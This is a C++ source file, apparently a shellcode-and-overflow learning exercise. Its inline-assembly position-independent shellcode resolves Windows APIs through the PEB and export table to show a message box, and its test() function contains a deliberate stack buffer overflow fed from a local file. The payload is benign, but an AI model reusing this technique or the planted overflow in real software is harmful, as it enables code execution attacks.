// ShellCode02.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <Windows.h>

#define defPath "D:\\cacheD\\2101_ShellCode\\ShellCode02\\shell.txt"


void shell()
{
	__asm
	{
		__asm _emit(0xE8)__asm _emit(0xFF)__asm _emit(0xFF)__asm _emit(0xFF);
		__asm _emit(0xFF)__asm _emit(0xC3)__asm _emit(0x5E);
		add esi, 0x1E;
		mov ecx, 0x1234578;
		xor ebx, ebx;
	tag_Decode:
		mov bx, [esi + ecx];
		mov[esi + ecx], bx;
		loop tag_Decode;
		push esi;
		mov ebp, esp;
		push esi;
		add esi, 15 + 12 + 13 + 11 + 12 + 7;	//指令+地址+文本
		jmp esi;
		//GetProcAddress 15
		__asm _emit(0x47)__asm _emit(0x65)__asm _emit(0x74)__asm _emit(0x50)
		__asm _emit(0x72)__asm _emit(0x6F)__asm _emit(0x63)__asm _emit(0x41)
		__asm _emit(0x64)__asm _emit(0x64)__asm _emit(0x72)__asm _emit(0x65)
		__asm _emit(0x73)__asm _emit(0x73)__asm _emit(0x00);
		//ExitProcess 12
		__asm _emit(0x45)__asm _emit(0x78)__asm _emit(0x69)__asm _emit(0x74)
		__asm _emit(0x50)__asm _emit(0x72)__asm _emit(0x6F)__asm _emit(0x63)
		__asm _emit(0x65)__asm _emit(0x73)__asm _emit(0x73)__asm _emit(0x00);
		//LoadLibraryA 13
		__asm _emit(0x4C)__asm _emit(0x6F)__asm _emit(0x61)__asm _emit(0x64)
		__asm _emit(0x4C)__asm _emit(0x69)__asm _emit(0x62)__asm _emit(0x72)
		__asm _emit(0x61)__asm _emit(0x72)__asm _emit(0x79)__asm _emit(0x41)
		__asm _emit(0x00);
		//user32.dll 11
		__asm _emit(0x75)__asm _emit(0x73)__asm _emit(0x65)__asm _emit(0x72)
		__asm _emit(0x33)__asm _emit(0x32)__asm _emit(0x2E)__asm _emit(0x64)
		__asm _emit(0x6C)__asm _emit(0x6C)__asm _emit(0x00);
		//MessageBoxA 12
		__asm _emit(0x4D)__asm _emit(0x65)__asm _emit(0x73)__asm _emit(0x73)
		__asm _emit(0x61)__asm _emit(0x67)__asm _emit(0x65)__asm _emit(0x42)
		__asm _emit(0x6F)__asm _emit(0x78)__asm _emit(0x41)__asm _emit(0x00);
		//CO0kie 7
		__asm _emit(0x43)__asm _emit(0x4F)__asm _emit(0x30)__asm _emit(0x6B)
		__asm _emit(0x69)__asm _emit(0x65)__asm _emit(0x00);
	tag_Load:	//加载API
		pop ecx;
		//解析链表
		mov esi, fs : [0x30] ;
		mov esi, [esi + 0x0C];
		mov esi, [esi + 0x1C];
		mov esi, [esi];
		mov esi, [esi + 0x08];
		call tag_GetProcAdd;
		pop ecx;
		add ecx, 15;	//Load字符串
		push ecx;		//保存ExitProcess
		mov edi, eax;
		push ecx;		//压入ExitProcess
		push esi;		//压入KerBase
		call edi;		//CALL GetProc

		pop ecx;
		add ecx, 12;	//Load
		push eax;		//保存ExitProcess

		push ecx;
		push ecx;		//压入Load
		push esi;		//压入KerBase
		call edi;		//CALL GetProc

		pop ecx;		//读取字符串
		add ecx, 13;	//得到user32.dll
		push eax;		//API Load
		push ecx;		//user32.dll

		push ecx;
		call eax;		//得到user32.dll的基址


		pop ecx;
		add ecx, 11;	//MessageBox
		push ecx;
		push ecx;
		push eax;
		call edi;		//CALL GetProc


		pop ecx;
		add ecx, 12;	//CO0kie
		push eax;
		push ecx;
		call tag_ShellCode;
		push edx;
		call[ebp];
	tag_GetProcAdd:
		// 找到GetProcAddress,并保存其地址
		mov eax, [esi + 0x3C]	// 获取PE头偏移
		add eax, esi;			// 获取PE头位置
		mov edx, [eax + 0x78];	// 获取Exprot偏移(64位好像是0x88)  (ecx => Export)
		add edx, esi;
		push edx;
		mov ebx, [edx + 0x18];	//获取名字数量
		push ebx;
		mov edi, [edx + 0x20]; // 获取ENT
		add edi, esi;
	tag_ENT:
		mov eax, [edi];
		add eax, esi;
		push ecx;
		push eax;
		call tag_strcmp;
		pop edx;
		pop ecx;
		add edi, 0x4;
		dec ebx;
		test eax, eax;
		jnz tag_ENT;
		//找到了该函数
		pop eax;
		sub eax, ebx;
		shl eax, 1;
		mov edi, [esp];
		call tag_GetAdd;	//获取函数地址
		pop edi;
		ret
	tag_GetAdd:
		mov ecx, [edi + 0x24]; // 获取EOT
		add ecx, esi;
		add ecx, eax;
		mov bx, [ecx];			//得到序号
		shl ebx, 2;				//*4

		mov ecx, [edi + 0x1C];	//获取EAT
		add ecx, esi;
		add ecx, ebx;
		mov eax, [ecx - 0x4];	//得到地址
		add eax, esi;
		ret;
	tag_strcmp:
		push esi;
		push edi;
		xchg eax, esi;
		xchg ecx, edi;
		mov ecx, 15;
		cld;					// 改变方向从左向右进行比较
		repe cmpsb;				// 循环按字节进行比较
		xchg ecx, eax;
		jz tag_strcmp2;
		inc eax;
	tag_strcmp2:
		pop edi;
		pop esi;
		ret;

	tag_ShellCode:
		push edx;
		push ecx;
		push ecx;
		push edx;
		call eax;
		ret;
		__asm _emit(0x90)__asm _emit(0x90)__asm _emit(0x90)__asm _emit(0x90);
	}
}

void test(char* buf, DWORD len)
{
	char buff[20];
	memcpy(buff, buf, len);
}

DWORD dwLen = 0, dwRead = 0;
int main()
{
	char buff[255];
	
	//读取文件信息
	HANDLE handle = CreateFileA(defPath, GENERIC_READ,		//打开文件句柄
		0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (handle == INVALID_HANDLE_VALUE)
		return 0;
	dwLen = GetFileSize(handle, 0);
	printf("打开文件%p\t%lu\n", handle, dwLen);
	if (ReadFile(handle, buff, dwLen, 0, NULL))
	{
		CloseHandle(handle);
		test(buff, dwLen);
		return 0;
	}
	__asm ret;
	MessageBoxA(0, 0, 0, 0);
	shell();
}